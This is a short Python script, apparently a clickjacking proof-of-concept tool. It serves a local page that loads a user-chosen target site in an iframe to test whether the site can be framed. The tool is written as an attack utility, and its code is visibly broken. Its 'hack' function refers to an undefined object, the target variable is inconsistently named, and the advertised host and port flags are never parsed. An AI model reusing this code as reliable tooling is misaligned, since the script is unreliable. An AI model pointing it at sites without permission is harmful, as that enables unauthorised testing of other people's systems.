import sys,requests
from http.server import test,HTTPServer,SimpleHTTPRequestHandler,BaseHTTPRequestHandler 

# variables ------------------------------------------------------------------

TARGET = ""
HOST = "localhost"
PORT = 8000
DIR_NAME = "tmp"

# clases

class PoC_Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("<html><head><meta charset='utf-8'><title>PoC - Clickjacking</title></head><body><p>Is this website vulnerable to Clickjacking?</p><iframe id='clickjackingFrame' src='%s' width='600px' height='500px'></body></html>" % target,"utf-8"))
        

# functions ------------------------------------------------------------------

def usage():
    print(f"Usage:\n\tpython3 {sys.argv[0]} -t <target> [--PoC | -lh <local_host> | -lp <local_port>]\n\nFlags:\n\t-t,    Set target to create a website that hijacks clicks on it.\n\t--PoC, Run proof of concept.\n\t-lh,   Set the host where the web server is going to be running (default: localhost).\n\t-lp,   Set the port where the web server is going to be running (default: 8000).\n")      
    exit()

def clickjackingPoC():
    PoC_Server.target = TARGET
    print("[+] PoC of Clickjacking of " + TARGET)
    webServer = HTTPServer((HOST, PORT), PoC_Server)#SimpleHTTPRequestHandleri)
    print("[+] Web-Server mounted in http://" + HOST + ":" + str(PORT))
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        pass
    webServer.server_close()
  
def clickjackingHack():
    server.target = TARGET         
    print("[+] Clickjacking of " + TARGET)
    print(TARGET + " Bye clickjacking Hack")


# read parameters -----------------------------------------------------------

if len(sys.argv) < 3 or len(sys.argv) > 4 or "-t" not in sys.argv:
	usage()

if "-t" in sys.argv:
    target = sys.argv[sys.argv.index("-t")+1]

if "--PoC" in sys.argv:
    clickjackingPoC()
elif len(sys.argv) == 3:
    clickjackingHack()
else:
    usage()

